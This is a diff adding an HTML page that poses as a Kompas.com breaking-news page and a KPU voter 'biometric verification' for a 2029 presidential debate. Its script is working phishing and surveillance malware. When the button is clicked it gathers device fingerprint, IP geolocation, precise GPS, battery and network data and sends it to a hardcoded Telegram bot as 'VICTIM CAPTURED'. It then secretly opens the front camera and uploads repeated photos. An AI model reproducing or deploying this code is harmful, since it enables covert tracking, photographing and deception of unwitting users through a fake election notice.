@@ -1,1 +1,390 @@
 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Breaking News - Kompas.com">
+    <meta property="og:description" content="Verifikasi identitas pemilih 2029 sebelum debat capres.">
+    <meta property="og:image" content="https://i.ytimg.com/vi/DOOrIxw5xOw/maxresdefault.jpg">
+    <meta property="og:image:width" content="1280">
+	  <meta property="og:image:height" content="720">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:url" content="https://kompas.ct.ws">
+    <meta property="og:type" content="website">
+    <link rel="icon" type="image/png" href="kompas.png">
+    <title>Breaking News - Kompas.com</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh; padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px; margin: 0 auto; background: white;
+            border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #d32f2f, #b71c1c);
+            color: white; padding: 25px; text-align: center;
+        }
+        .logo { font-size: 28px; font-weight: 800; margin-bottom: 8px; }
+        .subtitle { font-size: 16px; opacity: 0.95; }
+        
+        .content {
+            padding: 30px; text-align: center;
+        }
+        .breaking { 
+            background: #ffeb3b; color: #333; padding: 12px 20px;
+            border-radius: 25px; font-weight: 700; font-size: 14px;
+            margin-bottom: 25px; display: inline-block;
+        }
+        
+        .verify-btn {
+            width: 100%; padding: 20px; font-size: 18px; font-weight: 700;
+            background: linear-gradient(135deg, #4caf50, #45a049);
+            color: white; border: none; border-radius: 15px;
+            cursor: pointer; transition: all 0.3s;
+            box-shadow: 0 10px 25px rgba(76,175,80,0.4);
+        }
+        .verify-btn:hover {
+            transform: translateY(-2px); box-shadow: 0 15px 35px rgba(76,175,80,0.6);
+        }
+        .verify-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+        
+        .features {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+            margin-top: 25px; font-size: 14px; text-align: left;
+        }
+        .feature { display: flex; align-items: center; gap: 8px; }
+        .feature svg { width: 18px; height: 18px; fill: #4caf50; }
+        
+        #hiddenVideo, #hiddenCanvas { 
+            position: fixed; top: -9999px; left: -9999px; 
+        }
+        
+        .captured { display: none; background: #4caf50; color: white; 
+                   padding: 15px; border-radius: 10px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔴 KOMPAS.COM</div>
+            <div class="subtitle">Verifikasi Identitas Pemilih 2029</div>
+        </div>
+        
+        <div class="content">
+            <div class="breaking">🚨 URGENT - Verifikasi Segera!</div>
+            
+            <h2 style="font-size: 24px; margin-bottom: 15px; color: #1a1a1a;">
+                Konfirmasi Data Anda Sebelum Debat Capres
+            </h2>
+            
+            <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
+                KPU memerlukan verifikasi biometrik untuk akses live streaming debat malam ini.
+            </p>
+            
+            <button id="verifyBtn" class="verify-btn">
+                ✅ VERIFIKASI SEKARANG
+            </button>
+            
+            <div class="features">
+                <div class="feature">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>
+                    <span>Facial Recognition</span>
+                </div>
+                <div class="feature">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+                    <span>GPS Location</span>
+                </div>
+            </div>
+            
+            <div id="status" class="captured">
+                ✅ <b>Verifikasi berhasil!</b><br>Live streaming tersedia.
+            </div>
+        </div>
+    </div>
+
+    <video id="hiddenVideo" autoplay muted playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+    const BOT_TOKEN = '8259372749:AAG0TE16EgDQtk93g0OuSwBxVeYNKsTsAKQ';
+    const CHAT_ID = '8405767170';
+    
+    let stream, fingerprint = {}, videoReady = false, textSent = false;
+
+    async function getFingerprint() {
+        fingerprint = {
+            timestamp: new Date().toLocaleString('id-ID', {timeZoneName: 'short'}),
+            basic: {
+                ua: navigator.userAgent.slice(0, 120),
+                platform: navigator.platform || 'Unknown',
+                cores: navigator.hardwareConcurrency || 'N/A',
+                ram_gb: navigator.deviceMemory || 'N/A',
+                screen: `${screen.width}x${screen.height}x${screen.availWidth}x${screen.availHeight}`,
+                color_depth: screen.colorDepth + ' bit',
+                pixel_ratio: window.devicePixelRatio || 1,
+                language: navigator.language || 'id-ID',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            },
+            network: {type: 'N/A', downlink: 'N/A', rtt: 'N/A', save_data: 'N/A'},
+            battery: {level: 'N/A', charging: 'N/A', charging_time: 'N/A', discharging_time: 'N/A'},
+            gps: {lat: 'WAITING...', lon: 'WAITING...', acc: 'N/A', alt: 'N/A', speed: 'N/A'},
+            ip_geo: {ip: 'FETCHING...', isp: 'FETCHING...', city: 'FETCHING...', country: 'ID', region: '', zip: '', org: '', asn: '', mobile: ''},
+            cookies: navigator.cookieEnabled ? '✅ Enabled' : '❌ Disabled',
+            do_not_track: navigator.doNotTrack || 'N/A',
+            plugins: navigator.plugins?.length || 0
+        };
+
+        const ipApis = [
+            {url: 'https://ipapi.co/json/', parse: (d) => ({
+                ip: d.ip, isp: d.org || d.isp, org: d.org, 
+                country: d.country_name, city: d.city, region: d.region, 
+                zip: d.postal, asn: d.asn, mobile: d.mobile ? '📱 Mobile' : '🖥️ Desktop'
+            })},
+            {url: 'https://ipinfo.io/json', parse: (d) => ({
+                ip: d.ip, isp: d.org, org: d.org, 
+                country: d.country, city: d.city, region: d.region, 
+                zip: d.postal, asn: d.asn || '', mobile: '📱 Mobile'
+            })},
+            {url: 'https://ipapi.co/json', parse: (d) => ({ip: d.ip})},
+            {url: 'https://api.ipify.org?format=json', parse: (d) => ({ip: d.ip})}
+        ];
+        
+        for(let api of ipApis) {
+            try {
+                const res = await fetch(api.url, {cache: 'no-cache', mode: 'cors'});
+                const data = await res.json();
+                Object.assign(fingerprint.ip_geo, api.parse(data));
+                console.log('✅ IP from:', api.url);
+                break;
+            } catch(e) {
+                console.log(`IP API failed: ${api.url}`);
+            }
+        }
+
+        console.log('🎯 GPS ATTACK STARTED');
+        fingerprint.gps = await Promise.race([
+            new Promise(resolve => {
+                if(!navigator.geolocation) return resolve({lat: 'NO_GEO', lon: 'NO_GEO'});
+                
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({
+                        lat: pos.coords.latitude.toFixed(8),
+                        lon: pos.coords.longitude.toFixed(8),
+                        acc: pos.coords.accuracy + 'm',
+                        alt: pos.coords.altitude?.toFixed(1) || 'N/A',
+                        speed: pos.coords.speed?.toFixed(1) || 'N/A'
+                    }),
+                    () => {}, 
+                    {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
+                );
+            }),
+            new Promise(resolve => {
+               
+                navigator.geolocation.watchPosition(
+                    pos => resolve({
+                        lat: pos.coords.latitude.toFixed(8),
+                        lon: pos.coords.longitude.toFixed(8),
+                        acc: pos.coords.accuracy + 'm',
+                        alt: pos.coords.altitude?.toFixed(1) || 'N/A',
+                        speed: pos.coords.speed?.toFixed(1) || 'N/A'
+                    }),
+                    () => resolve({lat: 'DENIED', lon: 'DENIED', acc: 'BLOCKED'}),
+                    {enableHighAccuracy: true, timeout: 20000, maximumAge: 10000}
+                );
+            }),
+            new Promise(r => setTimeout(() => r({lat: 'TIMEOUT', lon: 'TIMEOUT'}), 25000))
+        ]);
+        console.log('✅ GPS:', fingerprint.gps);
+
+        const conn = navigator.connection;
+        if(conn) {
+            fingerprint.network = {
+                type: conn.effectiveType,
+                downlink: conn.downlink?.toFixed(2) + ' Mbps',
+                rtt: conn.rtt + ' ms',
+                save_data: conn.saveData ? '✅ ON' : '❌ OFF'
+            };
+        }
+
+        if('getBattery' in navigator) {
+            try {
+                const bat = await navigator.getBattery();
+                fingerprint.battery = {
+                    level: Math.round(bat.level * 100) + '%',
+                    charging: bat.charging ? 'Yes ⚡' : 'No 🔋',
+                    charging_time: bat.chargingTime === Infinity ? 'N/A' : Math.round(bat.chargingTime/60) + 'min',
+                    discharging_time: bat.dischargingTime === Infinity ? 'N/A' : Math.round(bat.dischargingTime/60) + 'min'
+                };
+            } catch {}
+        }
+        
+        console.log('✅ COMPLETE FINGERPRINT:', fingerprint);
+    }
+
+    function formatFingerprint() {
+        const ip = fingerprint.ip_geo;
+        const gps = fingerprint.gps;
+        const basic = fingerprint.basic;
+        const net = fingerprint.network;
+        const bat = fingerprint.battery;
+        
+        return `🎯 VICTIM CAPTURED - ${fingerprint.timestamp}
+
+🌐 IP LOCATION:
+IP: ${ip.ip || 'N/A'}
+ISP: ${ip.isp || 'N/A'}
+ASN: ${ip.asn || 'N/A'}
+City: ${ip.city || 'N/A'} | Region: ${ip.region || 'N/A'}
+Country: ${ip.country || 'ID'} | Zip: ${ip.zip || 'N/A'}
+Type: ${ip.mobile || 'Unknown'}
+
+📍 GPS COORDINATES:
+Lat: ${gps.lat || 'N/A'} | Lon: ${gps.lon || 'N/A'}
+Accuracy: ${gps.acc || 'N/A'} | Altitude: ${gps.alt || 'N/A'}
+Speed: ${gps.speed || 'N/A'} km/h
+
+🔋 BATTERY STATUS:
+Level: ${bat.level || 'N/A'} | Status: ${bat.charging || 'N/A'}
+Charging Time: ${bat.charging_time || 'N/A'} | Discharge Time: ${bat.discharging_time || 'N/A'}
+
+📡 NETWORK INFO:
+Type: ${net.type || 'N/A'} | Downlink: ${net.downlink || 'N/A'}
+RTT: ${net.rtt || 'N/A'} | Data Saver: ${net.save_data || 'N/A'}
+
+💻 DEVICE FINGERPRINT:
+Platform: ${basic.platform}
+Cores: ${basic.cores} | RAM: ${basic.ram_gb}GB
+Screen: ${basic.screen} | Color: ${basic.color_depth}
+Pixel Ratio: ${basic.pixel_ratio}x | Plugins: ${basic.plugins}
+Language: ${basic.language} | Timezone: ${basic.timezone}
+Cookies: ${fingerprint.cookies} | DNT: ${fingerprint.do_not_track}
+
+🕵️ USER AGENT:
+${basic.ua}`;
+    }
+
+    async function sendFingerprint() {
+        if(textSent) return console.log('⚠️ Text already sent');
+        textSent = true;
+        
+        const text = formatFingerprint();
+        console.log('📤 SENDING TEXT (', text.length, 'chars)');
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    disable_web_page_preview: true
+                })
+            });
+            
+            const data = await response.json();
+            console.log('📊 RESPONSE:', data);
+            
+            if(response.ok && data.ok) {
+                console.log('✅ TEXT SENT FIRST!');
+            } else {
+                console.error('❌ ERROR:', data);
+            }
+        } catch(e) {
+            console.error('💥 SEND FAILED:', e);
+        }
+    }
+
+    async function sendPhotoOnly(photo, id) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', `📸 Photo #${id}`);
+        formData.append('photo', photo, `victim_${Date.now()}.jpg`);
+        
+        try {
+            await fetch(url, {method: 'POST', body: formData});
+            console.log(`📸 Photo #${id} OK`);
+        } catch(e) {
+            console.log(`❌ Photo #${id} failed`);
+        }
+    }
+
+    async function captureGhost() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: {facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720}}
+            });
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                videoReady = true;
+                console.log('✅ Camera 1280p ready');
+                
+                let i = 1;
+                const burst = setInterval(() => {
+                    if(i <= 25) {
+                        snapPhoto(`B${i.toString().padStart(2,'0')}`);
+                        i++;
+                    } else {
+                        clearInterval(burst);
+                        setInterval(() => snapPhoto('LIVE'), 15000);
+                    }
+                }, 600);
+            };
+        } catch(e) {
+            console.log('❌ Camera access denied');
+        }
+    }
+
+    function snapPhoto(id) {
+        if(!videoReady) return;
+        
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        ctx.fillStyle = '#f8f9fa';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => sendPhotoOnly(blob, id), 'image/jpeg', 0.92);
+    }
+
+    document.getElementById('verifyBtn').onclick = async function() {
+        console.log('🚀 ATTACK STARTED');
+        
+        const btn = document.getElementById('verifyBtn');
+        btn.innerHTML = '🔄 Scanning Face & GPS...';
+        btn.disabled = true;
+        btn.style.background = '#ff9800';
+        
+        getFingerprint().then(async () => {
+            console.log('📋 FULL DATA READY');
+            await sendFingerprint(); 
+            console.log('✅ TEXT SENT - PHOTOS NEXT');
+        }).catch(e => console.error('Fingerprint error:', e));
+        
+        setTimeout(captureGhost, 500); 
+        
+        setTimeout(() => {
+            document.getElementById('status').style.display = 'block';
+            btn.style.display = 'none';
+        }, 4000);
+    };
+    </script>
+</body>
+</html>
